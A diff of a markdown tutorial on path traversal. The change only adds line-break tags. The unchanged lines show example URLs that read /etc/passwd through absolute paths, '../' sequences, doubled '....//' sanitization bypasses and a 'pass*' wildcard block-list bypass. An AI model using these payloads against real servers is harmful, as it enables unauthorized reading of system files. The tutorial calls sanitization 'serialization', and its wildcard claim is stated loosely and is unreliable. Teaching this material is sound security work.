@@ -14,18 +14,18 @@ On Windows, both ../ and ..\ are valid directory traversal sequences. The follow
 
 # Path traversal Types and Serialization.
 ## Absolut Path traversal.
-In this type of Path traversal, results can be obtained by using the absolute path:
+In this type of Path traversal, results can be obtained by using the absolute path:<br />
 `https://insecure-website.com/loadImage?filename=/etc/passwd`
 
 ## Relative Path traversal.
 `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
 
 ## Non-Recursive Sanitization Traversal
-In some cases, serialization techniques detect the path `../` and delete it. We can bypass this by doubling it and using `....//`:
+In some cases, serialization techniques detect the path `../` and delete it. We can bypass this by doubling it and using `....//`:<br />
 `https://insecure-website.com/loadImage?filename=....//....//....//....//etc/passwd`
 
 ## Black list bypass
-In other cases the server may have a black list that find some maches and invalidate them like `passwd`. We can bypass it using regular expresions `pass*`: 
+In other cases the server may have a black list that find some maches and invalidate them like `passwd`. We can bypass it using regular expresions `pass*`: <br />
 `https://insecure-website.com/loadImage?filename=....//....//....//....//etc/pass*`
 
 
